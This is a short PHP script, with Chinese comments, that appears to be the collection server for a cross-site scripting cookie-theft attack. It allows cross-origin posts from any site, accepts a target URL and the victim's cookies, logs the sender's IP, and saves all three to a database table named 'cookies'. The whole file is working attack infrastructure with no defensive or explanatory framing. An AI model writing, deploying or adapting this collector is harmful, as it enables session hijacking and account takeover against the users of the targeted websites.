<?php
include('./config.php');

// 允许所有域名访问，解决Ajax跨站问题
header('Access-Control-Allow-Origin:*');

// 获取客户端IP
function get_client_ip() {
    $ip = null;
    if (isset($_SERVER["REMOTE_ADDR"])) {
        $ip = $_SERVER["REMOTE_ADDR"];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim(current($ip));
    } else if (isset($_SERVER["HTTP_X_REAL_IP"])) {
        $ip = $_SERVER["HTTP_X_REAL_IP"];
    }
    return $ip;
}

// Get client data
$url = $_POST['url'];
$cookies = $_POST['cookies'];
$client_ip = get_client_ip();

// Save data
if ($url && $cookies && $client_ip) {
    // 预编译
    $add_client = $conn->prepare("INSERT INTO cookies (target_url, cookies, client_ip) VALUES (?, ?, ?)");
    $add_client->bind_param("sss", $url, $cookies, $client_ip);

    $add_client->execute();
    $add_client->close();
}

echo 1;
$conn->close();
